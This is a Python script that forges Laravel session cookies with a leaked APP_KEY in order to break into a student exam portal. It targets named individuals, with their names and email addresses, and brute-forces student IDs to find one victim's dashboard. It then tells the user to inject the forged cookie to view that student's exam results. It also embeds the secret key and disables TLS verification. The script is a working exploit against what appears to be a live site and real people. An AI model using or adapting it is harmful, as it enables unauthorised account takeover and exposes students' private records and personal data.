import base64
import json
import hashlib
import hmac
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# The exposed APP_KEY from .env (base64 decoded)
APP_KEY = base64.b64decode("kbqL/05YWl0TZEnb3oE4811UauhKhWps9c4IWsQiFHQ=")

def laravel_encrypt(payload_dict):
    """
    Encrypts a payload exactly like Laravel's Encrypter.
    Returns a base64-encoded cookie value.
    """
    # 1. Convert payload to JSON string
    payload_json = json.dumps(payload_dict, separators=(',', ':'))

    # 2. Generate random IV (16 bytes for AES-256-CBC)
    iv = get_random_bytes(16)

    # 3. Encrypt with AES-256-CBC (PKCS7 padding)
    cipher = AES.new(APP_KEY, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(payload_json.encode('utf-8'), AES.block_size))

    # 4. Calculate HMAC-SHA256 of (IV + encrypted) using APP_KEY
    mac = hmac.new(APP_KEY, iv + encrypted, hashlib.sha256).hexdigest()

    # 5. Build the Laravel cookie structure: {iv, value, mac}
    cookie_struct = {
        'iv': base64.b64encode(iv).decode('utf-8'),
        'value': base64.b64encode(encrypted).decode('utf-8'),
        'mac': mac
    }

    # 6. Base64 encode the entire JSON structure
    return base64.b64encode(json.dumps(cookie_struct).encode('utf-8')).decode('utf-8')

def build_student_payload(student_id, name="", email=""):
    """Build the exact session payload found in real student sessions."""
    return {
        "_token": "dummy",
        "_flash": {"new": [], "old": []},
        "_previous": {"url": "https://student.citexams.in/dashboard"},
        "isStudentSession": 1,
        "customer_id": student_id,
        "student_id": student_id,
        "student_name": name,
        "user_name": name,
        "email": email,
        "userRole": "Student",
        "college_id": 1,
        "college_name": "Cambridge Institute of Technology",
        "stream_id": 1,
        "stream_name": "Bachelor of Engineering",
        "branch_id": 7,
        "branch_name": "Electronics and Communication Engineering",
        "class_id": 16,
        "class_name": "Fourth Semester",
        "db_year": "2025 - 2026"
    }

def test_ahmed():
    """Test the forged session on Ahmed Faraaz (ID 1322)"""
    print("[*] Testing forged session for AHMED FARAAZ (ID 1322)...")
    payload = build_student_payload(1322, "AHMED FARAAZ", "ahmedfaraaz98@gmail.com")
    cookie = laravel_encrypt(payload)
    
    resp = requests.get(
        "https://student.citexams.in/dashboard",
        cookies={"laravel_session": cookie},
        verify=False,
        allow_redirects=False,
        timeout=5
    )
    
    if resp.status_code == 200 and "AHMED FARAAZ" in resp.text:
        print("[+] SUCCESS! Forged session works for Ahmed.")
        return True
    else:
        print(f"[-] Test failed. Status: {resp.status_code} (expected 200).")
        return False

def brute_afnan():
    """Brute-force AFNAN's ID (2000–5000)"""
    print("\n[*] Brute-forcing AFNAN TARIQ (2000–5000)...")
    for uid in range(2000, 5001):
        payload = build_student_payload(uid, "AFNAN TARIQ", "mirafnan619@gmail.com")
        cookie = laravel_encrypt(payload)
        
        try:
            resp = requests.get(
                "https://student.citexams.in/dashboard",
                cookies={"laravel_session": cookie},
                verify=False,
                allow_redirects=False,
                timeout=3
            )
            
            if resp.status_code == 200:
                # Check if we got AFNAN's dashboard
                if "AFNAN TARIQ" in resp.text:
                    print(f"\n✅✅✅ FOUND AFNAN TARIQ at ID: {uid} ✅✅✅")
                    print(f"Cookie: {cookie}")
                    print("\nInject this cookie into your browser (laravel_session) and visit /exam-result")
                    return
                else:
                    # We hit some other student – skip quietly
                    pass
            
            if uid % 100 == 0:
                print(f"   ...checked up to {uid}")
                
        except Exception:
            pass
        
        time.sleep(0.03)
    
    print("\n[-] AFNAN not found in 2000–5000. Try expanding the range.")

if __name__ == "__main__":
    if test_ahmed():
        brute_afnan()
    else:
        print("\n[!] Ahmed test failed – check APP_KEY or payload structure before continuing.")